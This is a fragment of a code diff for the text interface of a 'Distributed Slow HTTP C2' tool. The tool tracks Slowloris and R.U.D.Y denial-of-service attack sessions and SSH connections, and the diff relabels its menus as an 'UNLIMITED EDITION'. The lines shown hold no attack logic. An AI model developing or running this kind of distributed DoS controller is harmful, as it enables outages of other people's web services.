                 status_color = Colors.GREEN if session[8] == 'completed' else Colors.YELLOW if session[8] == 'running' else Colors.RED
-                attack_type = "Slowloris" if session[4] == 'slowloris' else "R.U.D.Y"
+                attack_type = "Slowloris (UNL)" if session[4] == 'slowloris' else "R.U.D.Y (UNL)"
                 
-                print(f"{session[0]:<4} {session[1][:19]:<20} {session[3][:24]:<25} {attack_type:<12} {status_color}{session[8]:<10}{Colors.RESET} {start_time}")
+                print(f"{session[0]:<4} {session[1][:24]:<25} {session[3][:19]:<20} {attack_type:<15} {status_color}{session[8]:<10}{Colors.RESET} {start_time}")
         
         input("\nPress Enter to continue...")
     
@@ -1444,7 +1493,7 @@ class SlowHTTPTUI:
         
         print(f"\n{Colors.BOLD}ATTACKS:{Colors.RESET}")
         print(f"Total Sessions: {Colors.CYAN}{len(sessions)}{Colors.RESET}")
-        print(f"Active Attacks: {Colors.GREEN}{active_attacks}{Colors.RESET}")
+        print(f"Active Unlimited Attacks: {Colors.RED}{active_attacks}{Colors.RESET}")
         
         # SSH Connections
         ssh_connections = len(self.ssh_manager.connections)
@@ -1455,6 +1504,7 @@ class SlowHTTPTUI:
         print(f"\n{Colors.BOLD}SYSTEM INFO:{Colors.RESET}")
         print(f"Database: {Colors.CYAN}{os.path.exists(self.db_manager.db_file)}{Colors.RESET}")
         print(f"Security Key: {Colors.CYAN}{os.path.exists('key.key')}{Colors.RESET}")
+        print(f"Mode: {Colors.RED}UNLIMITED EDITION{Colors.RESET}")
         
         input("\nPress Enter to continue...")
     
@@ -1478,7 +1528,7 @@ class SlowHTTPTUI:
                 elif choice == '5':
                     self.system_status_menu()
                 elif choice == '0':
-                    print(f"{Colors.YELLOW}[EXIT] Shutting down...{Colors.RESET}")
+                    print(f"{Colors.YELLOW}[EXIT] Shutting down unlimited C2...{Colors.RESET}")
                     break
                 else:
                     print(f"{Colors.RED}[ERROR] Invalid option{Colors.RESET}")
@@ -1513,6 +1563,7 @@ def main():
     
     # Initialize and run TUI
     try:
+        print("Starting Distributed Slow HTTP C2 - UNLIMITED EDITION...")
         tui = SlowHTTPTUI()
         tui.run()
     except Exception as e:
